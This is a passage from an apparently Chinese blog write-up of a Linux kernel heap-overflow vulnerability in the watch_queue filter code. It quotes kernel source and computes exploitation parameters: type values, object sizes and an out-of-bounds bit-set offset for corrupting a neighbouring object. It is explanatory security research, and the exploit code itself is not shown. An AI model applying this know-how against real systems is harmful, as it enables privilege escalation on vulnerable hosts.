O_NONBLOCK),</span><br><span class="line">  &amp;pipefifo_fops);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(res[<span class="number">0</span>])) &#123;</span><br><span class="line">put_pipe_info(inode, inode-&gt;i_pipe);</span><br><span class="line">fput(f);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(res[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line">res[<span class="number">0</span>]-&gt;private_data = inode-&gt;i_pipe;</span><br><span class="line">res[<span class="number">1</span>] = f;</span><br><span class="line">stream_open(inode, res[<span class="number">0</span>]);</span><br><span class="line">stream_open(inode, res[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而真正传入ops的是这个函数内部中，可以看到ops其实就是<code>pipefifo_fops</code>变量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pipefifo_fops</span> =</span> &#123;</span><br><span class="line">.open= fifo_open,</span><br><span class="line">.llseek= no_llseek,</span><br><span class="line">.read_iter= pipe_read,</span><br><span class="line">.write_iter= pipe_write,</span><br><span class="line">.poll= pipe_poll,</span><br><span class="line">.unlocked_ioctl= pipe_ioctl,</span><br><span class="line">.release= pipe_release,</span><br><span class="line">.fasync= pipe_fasync,</span><br><span class="line">.splice_write= iter_file_splice_write,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到<code>unlocked_ioctl</code>对应的也就是<code>pipe_ioctl函数</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">pipe_ioctl</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line"><span class="keyword">int</span> count, head, tail, mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line"><span class="keyword">case</span> FIONREAD:</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line">tail = pipe-&gt;tail;</span><br><span class="line">mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (tail != head) &#123;</span><br><span class="line">count += pipe-&gt;bufs[tail &amp; mask].len;</span><br><span class="line">tail++;</span><br><span class="line">&#125;</span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> put_user(count, (<span class="keyword">int</span> __user *)arg);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">case</span> IOC_WATCH_QUEUE_SET_SIZE: &#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">ret = watch_queue_set_size(pipe, arg);</span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> IOC_WATCH_QUEUE_SET_FILTER:</span><br><span class="line"><span class="keyword">return</span> watch_queue_set_filter(</span><br><span class="line">pipe, (struct watch_notification_filter __user *)arg);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -ENOIOCTLCMD;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在函数内部其实也就是个大的<code>switch</code>语句，并且在最后有一个处理<code>watch_queue_set_filter</code>函数，而漏洞正发生在其中。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="漏洞点一"><a href="#漏洞点一" class="headerlink" title="漏洞点一"></a>漏洞点一</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">watch_queue_set_filter</span><span class="params">(struct pipe_inode_info *pipe,</span></span></span><br><span class="line"><span class="params"><span class="function">    struct watch_notification_filter __user *_filter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_type_filter</span> *<span class="title">tf</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_filter</span> <span class="title">filter</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_type_filter</span> *<span class="title">q</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_filter</span> *<span class="title">wfilter</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">wqueue</span> =</span> pipe-&gt;watch_queue;</span><br><span class="line"><span class="keyword">int</span> ret, nr_filter = <span class="number">0</span>, i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!wqueue)</span><br><span class="line"><span class="keyword">return</span> -ENODEV;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!_filter) &#123;</span><br><span class="line"><span class="comment">/* Remove the old filter */</span></span><br><span class="line">wfilter = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">goto</span> <span class="built_in">set</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Grab the user&#x27;s filter specification */</span></span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;filter, _filter, <span class="keyword">sizeof</span>(filter)) != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (filter.nr_filters == <span class="number">0</span> ||</span><br><span class="line">    filter.nr_filters &gt; <span class="number">16</span> ||</span><br><span class="line">    filter.__reserved != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">tf = memdup_user(_filter-&gt;filters, filter.nr_filters * <span class="keyword">sizeof</span>(*tf));</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(tf))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(tf);</span><br><span class="line"></span><br><span class="line">ret = -EINVAL;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; filter.nr_filters; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> ((tf[i].info_filter &amp; ~tf[i].info_mask) ||</span><br><span class="line">    tf[i].info_mask &amp; WATCH_INFO_LENGTH)</span><br><span class="line"><span class="keyword">goto</span> err_filter;</span><br><span class="line"><span class="comment">/* Ignore any unknown types */</span></span><br><span class="line"><span class="keyword">if</span> (tf[i].type &gt;= <span class="keyword">sizeof</span>(wfilter-&gt;type_filter) * <span class="number">8</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">nr_filter++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Now we need to build the internal filter from only the relevant</span></span><br><span class="line"><span class="comment"> * user-specified filters.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ret = -ENOMEM;</span><br><span class="line">wfilter = kzalloc(struct_size(wfilter, filters, nr_filter), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!wfilter)</span><br><span class="line"><span class="keyword">goto</span> err_filter;</span><br><span class="line">wfilter-&gt;nr_filters = nr_filter;</span><br><span class="line"></span><br><span class="line">q = wfilter-&gt;filters;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; filter.nr_filters; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (tf[i].type &gt;= <span class="keyword">sizeof</span>(wfilter-&gt;type_filter) * BITS_PER_LONG)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">q-&gt;type= tf[i].type;</span><br><span class="line">q-&gt;info_filter= tf[i].info_filter;</span><br><span class="line">q-&gt;info_mask= tf[i].info_mask;</span><br><span class="line">q-&gt;subtype_filter[<span class="number">0</span>]= tf[i].subtype_filter[<span class="number">0</span>];</span><br><span class="line">__set_bit(q-&gt;type, wfilter-&gt;type_filter);</span><br><span class="line">q++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">kfree(tf);</span><br><span class="line"><span class="built_in">set</span>:</span><br><span class="line">pipe_lock(pipe);</span><br><span class="line">wfilter = rcu_replace_pointer(wqueue-&gt;filter, wfilter,</span><br><span class="line">      lockdep_is_held(&amp;pipe-&gt;mutex));</span><br><span class="line">pipe_unlock(pipe);</span><br><span class="line"><span class="keyword">if</span> (wfilter)</span><br><span class="line">kfree_rcu(wfilter, rcu);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_filter:</span><br><span class="line">kfree(tf);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先则是将用户空间的<code>_filter</code>拷贝到内核中，接着就是对结构体中的<code>nr_filters</code>和<code>__reservede</code>成员进行验证。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;filter, _filter, <span class="keyword">sizeof</span>(filter)) != <span class="number">0</span>)</span><br><span class="line">  <span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (filter.nr_filters == <span class="number">0</span> ||</span><br><span class="line">    filter.nr_filters &gt; <span class="number">16</span> ||</span><br><span class="line">    filter.__reserved != <span class="number">0</span>)</span><br><span class="line">  <span class="keyword">return</span> -EINVAL;</span><br></pre></td></tr></table></figure><p>接下来通过<code>memdup_user</code>函数将用户态<code>struct watch_notification_type_filter filters[]</code>数组放到临时的内存空间<code>tf</code>中。紧接着将根据<code>filter.nr_filters</code>进行for循环，并对<code>tf</code>中的内容进行校验。待都通过则会根据<code>struct_size(wfilter, filters, nr_filter)</code>生成一个<code>object</code>，而这个宏定义的含义其实是<code>sizeof(wfilter) + sizeof(filters) * nr_filter</code>。并且需要注意的是这里<code>nr_filter</code>并不是任何结构体中的成员，只是函数声明的一个局部变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; filter.nr_filters; i++) &#123;</span><br><span class="line">  <span class="keyword">if</span> (tf[i].type &gt;= <span class="keyword">sizeof</span>(wfilter-&gt;type_filter) * BITS_PER_LONG)</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">  q-&gt;type= tf[i].type;</span><br><span class="line">  q-&gt;info_filter= tf[i].info_filter;</span><br><span class="line">  q-&gt;info_mask= tf[i].info_mask;</span><br><span class="line">  q-&gt;subtype_filter[<span class="number">0</span>]= tf[i].subtype_filter[<span class="number">0</span>];</span><br><span class="line">  __set_bit(q-&gt;type, wfilter-&gt;type_filter);</span><br><span class="line">  q++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上代码片段，在后面通过for循环使用的却是<code>filter.nr_filters</code>并且这里对于type的验证验证和上面的也不相同。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BITS_PER_LONG 64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BITS_PER_LONG 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CONFIG_64BIT */</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tf[i].type &gt;= <span class="keyword">sizeof</span>(wfilter-&gt;type_filter) * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tf[i].type &gt;= <span class="keyword">sizeof</span>(wfilter-&gt;type_filter) * BITS_PER_LONG)</span><br></pre></td></tr></table></figure><p>所以不难想到的是可以通过指定<code>type</code>的值为这个<code>[0x80, 0x400)</code>区间内的特定值即可实现越界写。</p><h3 id="漏洞点二"><a href="#漏洞点二" class="headerlink" title="漏洞点二"></a>漏洞点二</h3><p>而第二个漏洞也位于在最后赋值时的<code>__set_bit</code>函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BIT_MASK(nr)(UL(1) &lt;&lt; ((nr) % BITS_PER_LONG))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BIT_WORD(nr)((nr) / BITS_PER_LONG)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __set_bit(<span class="keyword">int</span> nr, <span class="keyword">volatile</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> *addr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> mask = BIT_MASK(nr);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *p = ((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)addr) + BIT_WORD(nr);</span><br><span class="line"></span><br><span class="line">*p  |= mask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的作用就是将<code>addr</code>偏移为<code>BIT_WORD(nr)</code>处的<code>BIT_MASK(nr)</code>位置为1，因为type是可控的，所以控制得当的话可以越界置一位为1。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_type_filter</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">watch_notification_type</span> <span class="title">type</span>;</span></span><br><span class="line">__u32subtype_filter[<span class="number">1</span>];<span class="comment">/* Bitmask of subtypes to filter on */</span></span><br><span class="line">__u32info_filter;<span class="comment">/* Filter on watch_notification::info */</span></span><br><span class="line">__u32info_mask;<span class="comment">/* Mask of relevant bits in info_filter */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_filter</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>type_filter[<span class="number">2</span>];<span class="comment">/* Bitmask of accepted types */</span></span><br><span class="line">&#125;;</span><br><span class="line">u32nr_filters;<span class="comment">/* Number of filters */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_type_filter</span> <span class="title">filters</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面的<code>watch_filter</code>长这样。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>网上的有关这个CVE使用的方法几乎都是利用的漏洞二。当然，仔细想一下也会发现漏洞二在利用的过程中更为易用。接着就是思考溢出问题了，若是我们选择一个type为0x30a的话，我们得到的偏移为<code>(0x30a / 64) * 8 = 0x60</code>，所以我们只需要让上面的<code>object</code>的大小为0x60即可影响到后面的object了。所以我们这里选择的<code>nr_filters</code>为4，除去上面的这一个即为3。那么此时内核给<code>wfilter</code>分配的大小为<code>0x18 + 3 * 0x10 = 0x48</code>所以可以申请到<code>0x60</code>的<code>object</code>。这时再根据<code>BIT_MASK</code>计算可得最终结果为<code>0x400</code>。</p><p>其实说到这里的时候各位应该都想到了解题方法了吧。对的，可以使用 <a href="https://cv196082.gitee.io/2022/09/20/CVE-2021-22555%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90/">CVE-2021-22555</a> 即可完成后续利用 (这里不再详细解释了)。</p><h3 id="综上，可得exp"><a href="#综上，可得exp" class="headerlink" title="综上，可得exp"></a>综上，可得exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span 